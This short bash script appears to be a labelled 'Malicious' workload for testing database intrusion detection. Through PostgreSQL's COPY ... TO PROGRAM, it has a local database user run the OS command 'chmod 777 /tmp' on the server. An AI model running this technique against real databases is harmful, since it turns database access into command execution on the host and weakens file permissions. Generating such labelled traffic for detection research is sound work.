#!/usr/bin/env bash
# 4D OOD workload -- adapted from ../attack_workload/attack_priv_var_chmod_tmp.sh (legacy: casce_tpcb, -U postgres).
# Only connection and label changed; the OS command itself is unchanged.
set -u
REPEAT=${REPEAT:-1}
PSQL="psql -X -q -h 127.0.0.1 -d casce_banking"

echo "4D: OS command execution (chmod 777 /tmp), repeat ${REPEAT}..."
PGAPPNAME="casce_label=Malicious:os_chmod_tmp_r${REPEAT}" \
  $PSQL -U teller -c "COPY (SELECT 1) TO PROGRAM 'chmod 777 /tmp > /tmp/out_chmod_tmp.txt 2>/dev/null || true';"
